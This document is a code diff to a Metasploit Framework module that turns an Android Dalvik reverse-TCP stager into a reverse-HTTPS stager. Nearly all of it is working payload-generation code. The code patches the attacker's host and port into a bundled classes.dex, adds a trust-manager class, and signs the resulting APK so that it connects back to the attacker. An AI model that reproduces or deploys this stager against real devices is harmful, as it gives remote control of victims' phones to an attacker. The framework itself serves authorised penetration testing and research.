@@ -1,12 +1,14 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
+#
+#thanks to @SheriefEldeeb for explaining reverse_http concept
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
+require 'msf/core/handler/reverse_https'
 
 module Metasploit3
 
@@ -15,27 +17,31 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'			=> 'Dalvik Reverse TCP Stager',
-      'Description'	=> 'Connect back stager',
-      'Author'		=> 'timwr',
-      'License'		=> MSF_LICENSE,
-      'Platform'		=> 'android',
-      'Arch'			=> ARCH_DALVIK,
-      'Handler'		=> Msf::Handler::ReverseTcp,
-      'Stager'		=> {'Payload' => ""}
-    ))
+      'Name'          => 'Dalvik Reverse HTTPS Stager',
+      'Description'   => 'Tunnel communication over HTTPS',
+      'Author'        => 'anwarelmakrahy', 
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'android',
+      'Arch'          => ARCH_DALVIK,
+      'Handler'       => Msf::Handler::ReverseHttps,
+      'Stager'        => {'Payload' => ""}
+      ))
+    
+  		@class_files = [
+      [ "metasploit", "PayloadTrustManager.class" ],
+    ]
   end
-
+  
   def string_sub(data, placeholder, input)
     data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
   end
-
+  
   def generate_jar(opts={})
     jar = Rex::Zip::Jar.new
 
     classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
 
-    string_sub(classes, '127.0.0.1:M                     ', datastore['LHOST'].to_s + ":T") if datastore['LHOST']
+    string_sub(classes, '127.0.0.1:M                     ', datastore['LHOST'].to_s + ":HS") if datastore['LHOST']
     string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
     jar.add_file("classes.dex", fix_dex_header(classes))
 
@@ -46,7 +52,7 @@ module Metasploit3
       [ "resources.arsc" ]
     ]
 
-    jar.add_files(files, File.join(Msf::Config.data_directory, "android", "apk"))
+    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
     jar.build_manifest
 
     x509_name = OpenSSL::X509::Name.parse(
@@ -72,12 +78,11 @@ module Metasploit3
     # requirement. You can not upload an application if it is signed
     # with a key whose validity expires before that date.
     # """
-    # The timestamp 0x78045d81 equates to 2033-10-22 00:00:01 UTC
-    cert.not_after = Time.at( 0x78045d81  + rand( 0x7fffffff - 0x78045d81 ))
+    cert.not_after = cert.not_before + 3600*24*365*20 # 20 years
 
     jar.sign(key, cert, [cert])
 
     jar
   end
-
+ 
 end
